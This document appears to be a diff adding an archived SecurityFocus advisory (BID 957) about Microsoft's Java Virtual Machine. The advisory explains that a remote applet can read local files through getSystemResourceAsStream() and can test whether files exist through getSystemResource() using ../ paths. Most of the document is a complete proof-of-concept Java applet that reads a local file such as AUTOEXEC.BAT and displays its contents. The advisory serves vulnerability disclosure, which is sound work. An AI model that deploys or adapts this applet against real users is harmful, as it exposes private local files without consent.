@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/957/info
+
+Microsoft's Java Virtual Machine will allow the reading of local file information by a remote Java application. This can be done two ways:
+
+1: Via the getSystemResourceAsStream() function. The filename must be specified, and must be in certain paths: the JVM 'home' directory, and any directory in the CLASSPATH environment variable. For IE 5 the home directory is the current user's desktop, for IE4 it is C:\ . The specified file can be read.
+
+2: Via the getSystemResource() function. Unlike the first function, this one will accept the ../ string in the pathname, making it possible to access any file on the same drive as the Java installation. However, the file cannot be read, it is only possible to verify the existence or non-existence of a file by this method.
+
+import java.awt.*;
+import java.awt.event.*;
+import java.io.*;
+public class Test extends java.applet.Applet {
+TextArea outputArea;
+TextField filePathnameInputField;
+
+public void init() {
+setLayout(new BorderLayout());
+outputArea = new TextArea();
+add(BorderLayout.CENTER, outputArea);
+filePathnameInputField = new TextField();
+filePathnameInputField.setText("AUTOEXEC.BAT");
+Panel p = new Panel();
+p.setLayout(new BorderLayout());
+add(BorderLayout.NORTH, p);
+p.add(BorderLayout.CENTER, filePathnameInputField);
+Button actionButton = new Button("Read It!");
+p.add(BorderLayout.EAST, actionButton);
+actionButton.addActionListener(new ActionListener() {
+public void actionPerformed(ActionEvent e) {
+new ActionThread().start();
+}
+});
+}
+class ActionThread extends Thread {
+public void run() {
+try {
+String filePathname = filePathnameInputField.getText();
+// InputStream is = getClass().getResourceAsStream(filePathname);
+InputStream is = ClassLoader.getSystemResourceAsStream(filePathname);
+BufferedReader br = new BufferedReader(new InputStreamReader(is));
+StringBuffer buf = new StringBuffer();
+while (true) {
+String line = br.readLine();
+if (line == null) break;
+buf.append(line).append("\n");
+}
+outputArea.setText(new String(buf));
+} catch (Exception e) {
+outputArea.setText(e.toString());
+}
+}
+}
+} 
